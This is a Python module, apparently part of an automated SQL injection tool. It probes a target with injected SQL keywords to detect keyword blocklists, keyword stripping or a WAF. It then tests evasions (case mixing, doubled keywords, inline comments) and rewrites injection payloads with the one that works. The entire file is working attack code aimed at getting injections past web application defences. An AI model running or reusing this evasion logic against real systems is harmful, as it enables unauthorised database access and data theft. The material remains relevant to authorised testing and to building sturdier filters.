"""
SQL Injection Filter Detection and Bypass Testing

Detects input filters/WAFs and tests bypass techniques in black box manner.
Critical for adaptive exploitation in filtered environments.
"""
import logging
import asyncio
from typing import List, Dict, Optional, Callable, Awaitable, Tuple
from dataclasses import dataclass
from enum import Enum


class FilterType(Enum):
    """Type of filter detected"""
    NONE = "none"
    KEYWORD_BLOCKLIST = "keyword_blocklist"  # Returns error when keyword present
    KEYWORD_REMOVAL = "keyword_removal"      # Strips keywords silently
    WAF = "waf"                               # Full WAF with rate limiting
    UNKNOWN = "unknown"


class BypassTechnique(Enum):
    """Bypass techniques to test"""
    NONE = "none"
    CASE_MIXING = "case_mixing"           # SeLeCt
    DOUBLED_KEYWORDS = "doubled_keywords"  # SELSELECTECT
    COMMENT_INJECTION = "comment_injection" # SE/**/LECT
    ENCODING = "encoding"                   # URL/hex encoding
    WHITESPACE_VARIATION = "whitespace"     # Tabs, newlines
    UNKNOWN = "unknown"


@dataclass
class FilterProfile:
    """Profile of detected filter"""
    filter_type: FilterType
    blocked_keywords: List[str]
    working_bypass: Optional[BypassTechnique]
    bypass_examples: Dict[str, str]  # keyword -> bypassed version
    confidence: float  # 0.0-1.0


class SQLiFilterDetector:
    """
    Detects SQL injection filters and discovers bypass techniques

    Black box approach:
    1. Test baseline behavior
    2. Test with SQL keywords
    3. Detect if filtered (empty results vs error vs normal)
    4. Test bypass techniques
    5. Identify working technique
    """

    # Keywords to test for filtering
    TEST_KEYWORDS = [
        'SELECT', 'UNION', 'OR', 'AND', 'FROM', 'WHERE',
        'INSERT', 'UPDATE', 'DELETE', 'DROP', 'EXEC'
    ]

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)

    async def detect_filter(
        self,
        submit_func: Callable[[str], Awaitable[Tuple[str, int, float]]],
        baseline_payload: str,
        baseline_response: str
    ) -> FilterProfile:
        """
        Detect if input filtering is present

        Args:
            submit_func: Function that submits payload and returns (response, status, time)
            baseline_payload: Known good payload (e.g., valid value)
            baseline_response: Response for baseline

        Returns:
            FilterProfile with detection results
        """

        self.logger.info("[Filter Detection] Testing for input filters...")

        blocked_keywords = []
        filter_type = FilterType.NONE

        # Phase 1: Test each keyword
        for keyword in self.TEST_KEYWORDS:
            # Test with keyword appended to valid input
            test_payload = f"{baseline_payload}' {keyword}--"

            try:
                response, status, time_taken = await submit_func(test_payload)

                # Analyze response
                if status in [403, 406, 500]:
                    # Likely blocked by WAF
                    blocked_keywords.append(keyword)
                    filter_type = FilterType.KEYWORD_BLOCKLIST
                    self.logger.info(f"  [BLOCKED] {keyword} triggers error (status {status})")

                elif len(response) == 0 or response == "[]":
                    # Empty response might indicate keyword removal
                    blocked_keywords.append(keyword)
                    if filter_type == FilterType.NONE:
                        filter_type = FilterType.KEYWORD_REMOVAL
                    self.logger.info(f"  [FILTERED] {keyword} causes empty response (likely removed)")

                elif response == baseline_response:
                    # Same response = keyword had no effect (removed)
                    blocked_keywords.append(keyword)
                    filter_type = FilterType.KEYWORD_REMOVAL
                    self.logger.info(f"  [REMOVED] {keyword} had no effect (stripped)")

                else:
                    # Different response = keyword worked (or syntax error which is good)
                    self.logger.info(f"  [OK] {keyword} not filtered")

            except Exception as e:
                self.logger.warning(f"  [ERROR] Testing {keyword}: {e}")
                continue

        if not blocked_keywords:
            self.logger.info("[Filter Detection] No filtering detected")
            return FilterProfile(
                filter_type=FilterType.NONE,
                blocked_keywords=[],
                working_bypass=None,
                bypass_examples={},
                confidence=1.0
            )

        self.logger.info(f"[Filter Detection] Detected {filter_type.value}")
        self.logger.info(f"  Blocked keywords: {', '.join(blocked_keywords[:5])}")

        # Phase 2: Test bypass techniques
        working_bypass, bypass_examples = await self._test_bypass_techniques(
            submit_func=submit_func,
            baseline_payload=baseline_payload,
            blocked_keywords=blocked_keywords,
            filter_type=filter_type
        )

        confidence = 0.9 if working_bypass else 0.7

        return FilterProfile(
            filter_type=filter_type,
            blocked_keywords=blocked_keywords,
            working_bypass=working_bypass,
            bypass_examples=bypass_examples,
            confidence=confidence
        )

    async def _test_bypass_techniques(
        self,
        submit_func: Callable,
        baseline_payload: str,
        blocked_keywords: List[str],
        filter_type: FilterType
    ) -> Tuple[Optional[BypassTechnique], Dict[str, str]]:
        """
        Test various bypass techniques to find one that works

        Returns:
            (working_technique, examples_dict)
        """

        self.logger.info("[Bypass Testing] Testing bypass techniques...")

        # Test with a few representative keywords
        test_keywords = blocked_keywords[:3]

        bypass_examples = {}

        # Technique 1: Case Mixing
        self.logger.info("  Testing: Case mixing (SeLeCt)")
        case_mixed_works = await self._test_case_mixing(
            submit_func, baseline_payload, test_keywords, bypass_examples
        )
        if case_mixed_works:
            self.logger.info("  ✅ Case mixing bypasses filter!")
            return BypassTechnique.CASE_MIXING, bypass_examples

        # Technique 2: Doubled Keywords
        self.logger.info("  Testing: Doubled keywords (SELSELECTECT)")
        doubled_works = await self._test_doubled_keywords(
            submit_func, baseline_payload, test_keywords, bypass_examples
        )
        if doubled_works:
            self.logger.info("  ✅ Doubled keywords bypass filter!")
            return BypassTechnique.DOUBLED_KEYWORDS, bypass_examples

        # Technique 3: Comment Injection
        self.logger.info("  Testing: Comment injection (SE/**/LECT)")
        comment_works = await self._test_comment_injection(
            submit_func, baseline_payload, test_keywords, bypass_examples
        )
        if comment_works:
            self.logger.info("  ✅ Comment injection bypasses filter!")
            return BypassTechnique.COMMENT_INJECTION, bypass_examples

        self.logger.info("  ❌ No bypass technique successful")
        return None, {}

    async def _test_case_mixing(
        self,
        submit_func: Callable,
        baseline_payload: str,
        keywords: List[str],
        bypass_examples: Dict[str, str]
    ) -> bool:
        """Test if case mixing bypasses filter"""

        for keyword in keywords:
            # Create case-mixed version
            mixed = self._case_mix(keyword)
            test_payload = f"{baseline_payload}' {mixed}--"

            try:
                response, status, _ = await submit_func(test_payload)

                # If we get non-empty response or SQL error (not filter error), it worked
                if status not in [403, 406] and (len(response) > 0 or status == 500):
                    bypass_examples[keyword] = mixed
                    self.logger.info(f"    ✓ {keyword} → {mixed} works!")
                    return True
            except:
                continue

        return False

    async def _test_doubled_keywords(
        self,
        submit_func: Callable,
        baseline_payload: str,
        keywords: List[str],
        bypass_examples: Dict[str, str]
    ) -> bool:
        """Test if doubled keywords bypass filter (e.g., SELSELECTECT)"""

        for keyword in keywords:
            # Create doubled version
            mid = len(keyword) // 2
            doubled = keyword[:mid] + keyword + keyword[mid:]
            test_payload = f"{baseline_payload}' {doubled}--"

            try:
                response, status, _ = await submit_func(test_payload)

                if status not in [403, 406] and (len(response) > 0 or status == 500):
                    bypass_examples[keyword] = doubled
                    self.logger.info(f"    ✓ {keyword} → {doubled} works!")
                    return True
            except:
                continue

        return False

    async def _test_comment_injection(
        self,
        submit_func: Callable,
        baseline_payload: str,
        keywords: List[str],
        bypass_examples: Dict[str, str]
    ) -> bool:
        """Test if comment injection bypasses filter (e.g., SE/**/LECT)"""

        for keyword in keywords:
            # Insert comment in middle
            mid = len(keyword) // 2
            commented = keyword[:mid] + "/**/" + keyword[mid:]
            test_payload = f"{baseline_payload}' {commented}--"

            try:
                response, status, _ = await submit_func(test_payload)

                if status not in [403, 406] and (len(response) > 0 or status == 500):
                    bypass_examples[keyword] = commented
                    self.logger.info(f"    ✓ {keyword} → {commented} works!")
                    return True
            except:
                continue

        return False

    def _case_mix(self, keyword: str) -> str:
        """Create case-mixed version of keyword"""
        result = ""
        for i, char in enumerate(keyword):
            if i % 2 == 0:
                result += char.upper()
            else:
                result += char.lower()
        return result

    def apply_bypass(self, payload: str, filter_profile: FilterProfile) -> str:
        """
        Apply discovered bypass technique to a payload

        Args:
            payload: Original SQL injection payload
            filter_profile: Detected filter profile with working bypass

        Returns:
            Modified payload with bypass applied
        """

        if not filter_profile.working_bypass or filter_profile.working_bypass == BypassTechnique.NONE:
            return payload

        modified = payload

        if filter_profile.working_bypass == BypassTechnique.CASE_MIXING:
            # Apply case mixing to SQL keywords
            import re
            for keyword in self.TEST_KEYWORDS:
                if re.search(keyword, modified, re.IGNORECASE):
                    # Find and replace with case-mixed version (preserving other case)
                    mixed = self._case_mix(keyword)
                    modified = re.sub(keyword, mixed, modified, flags=re.IGNORECASE)

        elif filter_profile.working_bypass == BypassTechnique.DOUBLED_KEYWORDS:
            # Double keywords
            import re
            for keyword in self.TEST_KEYWORDS:
                if re.search(keyword, modified, re.IGNORECASE):
                    mid = len(keyword) // 2
                    doubled = keyword[:mid] + keyword + keyword[mid:]
                    modified = re.sub(keyword, doubled, modified, flags=re.IGNORECASE)

        elif filter_profile.working_bypass == BypassTechnique.COMMENT_INJECTION:
            # Insert comments
            import re
            for keyword in self.TEST_KEYWORDS:
                if re.search(keyword, modified, re.IGNORECASE):
                    mid = len(keyword) // 2
                    commented = keyword[:mid] + "/**/" + keyword[mid:]
                    modified = re.sub(keyword, commented, modified, flags=re.IGNORECASE)

        return modified
